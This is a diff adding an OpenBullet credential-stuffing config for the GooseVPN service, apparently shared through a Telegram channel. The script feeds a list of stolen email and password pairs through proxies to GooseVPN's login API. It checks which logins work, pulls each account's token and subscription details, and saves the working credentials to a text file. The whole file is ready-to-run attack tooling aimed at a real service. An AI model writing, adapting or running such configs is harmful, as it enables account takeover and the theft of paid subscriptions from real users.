@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "GooseVPN",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:43:16.0183301-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api1.goosevpn.com/auth/email" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Host: api1.goosevpn.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"code\":\"E1101\"" 
+    KEY "\"message\":\"Unable to authenticate user with WHMCS server.\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"token" 
+
+#Token PARSE "<SOURCE>" JSON "token" -> VAR "Token" 
+
+#GetInfo REQUEST GET "https://api1.goosevpn.com/users/me/plan" 
+  
+  HEADER "Authorization: Bearer: <Token>" 
+  HEADER "Host: api1.goosevpn.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+
+#IsUnlimited PARSE "<SOURCE>" LR "is_unlimited\":" "," CreateEmpty=FALSE -> CAP "Is Unlimited" 
+
+#IsTrial PARSE "<SOURCE>" LR "is_trial\":" "," CreateEmpty=FALSE -> CAP "Is Trial" 
+
+#IsAnnual PARSE "<SOURCE>" LR "is_annual\":" "," CreateEmpty=FALSE -> CAP "Is Annual" 
+
+#Status PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "Status" 
+
+#AccountType PARSE "<SOURCE>" JSON "account_type" CreateEmpty=FALSE -> CAP "Account Type" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Status>" Contains "Cancelled" 
+    KEY "<Account Type>" Contains "whmcs" 
+
+UTILITY File "GooseVpn.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
